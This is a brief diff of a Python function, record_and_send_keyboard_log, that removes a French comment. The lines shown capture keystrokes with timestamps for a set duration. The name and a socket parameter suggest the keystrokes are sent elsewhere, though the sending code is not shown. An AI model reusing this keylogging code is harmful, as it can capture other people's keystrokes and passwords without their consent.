@@ -75,7 +75,7 @@ def record_and_send_keyboard_log(duration=10, sio=None):
 
         while time.time() - start_time < duration:
             event = keyboard.read_event()
-            keyboard_log[event.name] = time.time()  # Enregistrer chaque événement avec son horodatage dans un dictionnaire
+            keyboard_log[event.name] = time.time()
 
         # Convertir le dictionnaire en une liste de tuples (nom de l'événement, horodatage)
         keyboard_log_list = [(key, value) for key, value in keyboard_log.items()]
